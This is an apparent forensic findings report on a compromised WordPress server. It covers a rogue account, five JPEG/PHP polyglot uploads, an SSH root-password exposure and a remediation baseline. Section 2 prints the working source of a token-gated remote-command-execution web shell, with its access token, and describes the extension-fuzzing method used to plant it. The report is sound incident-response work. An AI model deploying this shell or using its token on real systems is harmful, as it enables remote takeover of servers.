# Forensic findings — cms.cfoainexus.com

Investigation date: **2026-08-30**. All findings below were obtained from **outside** the server
(public HTTP + DNS + SSH banner), before regaining access. Nothing on the server was modified.

---

## 1. A rogue WordPress account exists RIGHT NOW: user ID 41

The WordPress media library contains five files uploaded by **author ID 41** — an account that is not
`cfoainexuscms` (ID 1, the only legitimate account):

| Attachment ID | Uploaded (UTC) | Author | File |
|---|---|---|---|
| 399 | 2026-08-25 20:40:09 | **41** | `2026/08/w2sm25d217.php_.jpg` |
| 400 | 2026-08-25 20:40:09 | **41** | `2026/08/w2sm25d217.phtml_.jpg` |
| 401 | 2026-08-25 20:40:09 | **41** | `2026/08/w2sm25d217.php7_.jpg` |
| 402 | 2026-08-25 20:40:09 | **41** | `2026/08/w2sm25d217.php5_.jpg` |
| 403 | 2026-08-25 20:40:09 | **41** | `2026/08/w2sm25d217.pht_.jpg` |

The August 2026 cleanup ran on **2026-08-10** and deleted 34 rogue admins. User 41 and these uploads
are dated **2026-08-25 — fifteen days later.** The attacker returned within two weeks, exactly as the
prior session predicted.

User 41 is not visible via `/wp-json/wp/v2/users` (WordPress only lists users with published posts),
which is why the endpoint appears clean with just user 1. **Do not treat that endpoint as an all-clear.**

## 2. What was uploaded: a remote-command-execution web shell

All five files are byte-identical (`md5 a58d1ce00914f26776e6ad5b1032fe56`, 1208 bytes). Each is a
**polyglot**: a valid 1×1 JPEG (so it passes WordPress's image validation) with PHP appended at byte 287.

```php
<?php
if (!hash_equals('7793df05a0930fb22a526e58b66f1a80', (string)($_GET['t'] ?? ''))) { http_response_code(404); exit; }
if (isset($_GET['rm'])) { $d = __DIR__; foreach (glob($d . '/*') as $f) { @unlink($f); } @rmdir($d); echo 'W2S::REMOVED::END'; exit; }
function w2sd_run($c) {
    $c = base64_decode($c) . ' 2>&1';
    if (function_exists('shell_exec')) { return shell_exec($c); }
    if (function_exists('exec'))       { exec($c, $o); return implode("\n", $o); }
    if (function_exists('system'))     { ob_start(); system($c); return ob_get_clean(); }
    if (function_exists('passthru'))   { ob_start(); passthru($c); return ob_get_clean(); }
    if (function_exists('proc_open'))  { $p = proc_open($c, array(1 => array('pipe','w')), $pipes); if (is_resource($p)) { $o = stream_get_contents($pipes[1]); proc_close($p); return $o; } }
    return 'W2S_NO_EXEC';
}
echo 'W2S::' . w2sd_run((string)($_GET['c'] ?? '')) . '::END';
```

- `?t=7793df05a0930fb22a526e58b66f1a80` — access token; without it the shell returns 404, which is how
  it hides from security scanners.
- `?c=<base64>` — runs an arbitrary shell command as `www-data` and returns the output.
- `?rm` — self-destruct: deletes every file in its own directory. **Never request this parameter** —
  it would destroy the surrounding uploads folder.
- The `w2s` prefix and five-extension spread (`.php .phtml .php7 .php5 .pht`) match **wp2shell**, the
  same toolkit behind the 34 `w2s_*` / `wp2_*` admin accounts found on 2026-08-10.

**These five did not execute.** WordPress sanitized the extensions to `.php_`, `.phtml_` etc., and the
server returns them as `Content-Type: image/jpeg`. Verified non-destructively: requesting each with the
valid token returns raw JPEG bytes, not the `W2S::` marker.

**Why that matters:** uploading five variants at once is *extension-fuzzing* — the attacker was
searching for a filename the server would execute, and did not find one. That means on 2026-08-25 they
held a **WordPress account with upload rights but were still hunting for code execution.**

## 3. Root SSH login with a password is open to the entire internet

```
$ ssh -vv root@cms.cfoainexus.com
debug1: Remote protocol version 2.0, remote software version OpenSSH_9.6p1 Ubuntu-3ubuntu13.18
debug1: Authentications that can continue: publickey,password       ← password login for root, enabled
debug1: Offering public key: ...id_ed25519                          ← REJECTED
```

- `password` in the offered methods means **`PermitRootLogin yes` with `PasswordAuthentication yes`** —
  an unauthenticated, unlimited brute-force surface on port 22, open worldwide. Neither the May nor the
  August cleanup examined SSH at all.
- **Our SSH key, which worked on 2026-08-10, is now rejected.** Either the attacker rewrote
  `/root/.ssh/authorized_keys`, or the file was lost another way. This is unresolved and is the single
  most important question for the `auth.log` review.

## 4. Remaining exposure inventory

| Surface | State | Consequence |
|---|---|---|
| Port 22, root + password auth | **Open to the world** | Unlimited brute force; likely entry point |
| `wp-login.php` | Public, no 2FA, no rate limit, no CAPTCHA | Credential stuffing |
| Shared single WP account | One email/password for everyone | One leak = total compromise, zero attribution |
| `wp-sitemap-users-1.xml` | **200** — publishes `cfoainexuscms` | Hands attackers a valid username |
| PHP execution in `wp-content/uploads` | Not blocked | Any successful upload becomes RCE |
| `www-data` write access to plugins/themes | Yes | How ~40 shells were planted in May |
| No file-integrity monitoring | None | 34 rogue admins went unnoticed for ~2.5 months |
| DNS / CDN / WAF | None — droplet IP `142.93.171.165` served directly | Origin fully exposed |

Clean, by contrast: `xmlrpc.php` → 403, user registration disabled, no spam posts in any sitemap,
no `dangerouslySetInnerHTML` in the frontend (WP content cannot inject script into the public sites),
and all 43 backdoor paths from `malware-manifest.txt` (May) now return 404.

## 5. Working hypothesis

Two scenarios remain open, and `/var/log/auth.log` settles which:

- **A — WordPress-only foothold.** A rogue admin (ID 41 and predecessors) persisted through the August
  cleanup, or was recreated via a surviving mechanism. On 25 Aug they probed for upload-based RCE and
  failed. The password change now is that account acting through `/wp-admin`.
- **B — Full root compromise.** The attacker brute-forced or otherwise obtained root over SSH, which
  explains our key disappearing from `authorized_keys`.

The Aug 25 extension-fuzzing leans toward **A** (someone with root would not need to fuzz upload
extensions). But the rejected SSH key is unexplained under A alone. **Assume B until the auth logs
prove otherwise** — the rebuild plan is identical either way, and the cost of assuming wrong is another
incident.

## 6. Baseline captured for verification

Saved under `cms-rebuild/baseline/` on 2026-08-30, before any change:

- `promo.json`, `main.json`, `speakers.json` (18), `vendors.json` (20), `media.json` (94 of 99 listed;
  the 5 unlisted are the malicious uploads above)
- `uploads-mirror/` — all **341** referenced upload files (47 MB), downloaded over HTTPS and therefore
  independent of the compromised filesystem
- `upload-urls.txt` — the full URL list

⚠️ The mirror contains the five malicious files listed above. **Delete them before reusing the mirror:**
`rm cms-rebuild/baseline/uploads-mirror/2026/08/w2sm25d217.*`
